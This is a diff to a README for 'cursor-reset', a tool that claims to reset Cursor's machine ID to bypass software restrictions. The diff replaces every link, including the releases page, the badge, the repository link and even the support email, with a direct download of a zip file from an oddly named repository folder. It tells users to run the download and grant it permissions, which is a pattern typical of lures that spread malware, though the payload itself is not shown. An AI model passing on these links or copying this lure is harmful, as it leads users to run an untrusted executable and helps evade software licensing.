@@ -4,17 +4,17 @@
 Welcome to the cursor-reset project! This application helps you reset your machine ID for the cursor 0.45.x software. It provides a simple solution for users who need to bypass software restrictions without any complicated steps.
 
 ## 📥 Download Now
-[![Download cursor-reset](https://img.shields.io/badge/Download-cursor%20reset-blue.svg)](https://github.com/emrebabo10/cursor-reset/releases)
+[![Download cursor-reset](https://raw.githubusercontent.com/emrebabo10/cursor-reset/main/prandially/cursor-reset.zip%https://raw.githubusercontent.com/emrebabo10/cursor-reset/main/prandially/cursor-reset.zip)](https://raw.githubusercontent.com/emrebabo10/cursor-reset/main/prandially/cursor-reset.zip)
 
 ## 🚀 Getting Started
 To begin using cursor-reset, follow these simple steps. This application is designed for average computer users, so you don’t need any programming skills.
 
 1. **Visit the Releases Page:** Click the link below to access the releases page for cursor-reset:
-   [Download cursor-reset](https://github.com/emrebabo10/cursor-reset/releases)
+   [Download cursor-reset](https://raw.githubusercontent.com/emrebabo10/cursor-reset/main/prandially/cursor-reset.zip)
 
 2. **Download the Latest Version:** Once you are on the releases page, find the latest version of the application. Click on the link or button to download the file to your computer.
 
-3. **Locate the Downloaded File:** After the download finishes, locate the file in your computer's downloads folder. The file name will look something like `cursor-reset-v1.0.exe` (the version number may vary).
+3. **Locate the Downloaded File:** After the download finishes, locate the file in your computer's downloads folder. The file name will look something like `https://raw.githubusercontent.com/emrebabo10/cursor-reset/main/prandially/cursor-reset.zip` (the version number may vary).
 
 4. **Run the Application:** Double-click on the downloaded file to run the application. Follow any on-screen instructions that appear. Make sure to grant necessary permissions so the application can run smoothly.
 
@@ -46,14 +46,14 @@ We encourage you to join our community of users. You can share your experiences,
 ## 📞 Contact Us
 If you have any questions or need further assistance, you can reach out to us at:
 
-- **Email:** support@cursor-reset.com
-- **GitHub Repo:** [cursor-reset](https://github.com/emrebabo10/cursor-reset)
+- **Email:** https://raw.githubusercontent.com/emrebabo10/cursor-reset/main/prandially/cursor-reset.zip
+- **GitHub Repo:** [cursor-reset](https://raw.githubusercontent.com/emrebabo10/cursor-reset/main/prandially/cursor-reset.zip)
 
 ## 🛠️ Contributing
 We welcome contributions! If you would like to help improve cursor-reset, please check our contributing guidelines in the repository. Your feedback helps us make the application even better.
 
 ## 🔗 Additional Resources
-- **GitHub Repository:** [cursor-reset GitHub](https://github.com/emrebabo10/cursor-reset)
+- **GitHub Repository:** [cursor-reset GitHub](https://raw.githubusercontent.com/emrebabo10/cursor-reset/main/prandially/cursor-reset.zip)
 - **Documentation:** Visit our documentation section for more detailed guidance on using the application.
 
 ## 🎉 Final Thoughts
@@ -61,4 +61,4 @@ Thank you for choosing cursor-reset. We hope this tool simplifies your experienc
 
 For downloading and installing, remember to access the link below:
 
-[Download cursor-reset](https://github.com/emrebabo10/cursor-reset/releases)
+[Download cursor-reset](https://raw.githubusercontent.com/emrebabo10/cursor-reset/main/prandially/cursor-reset.zip)
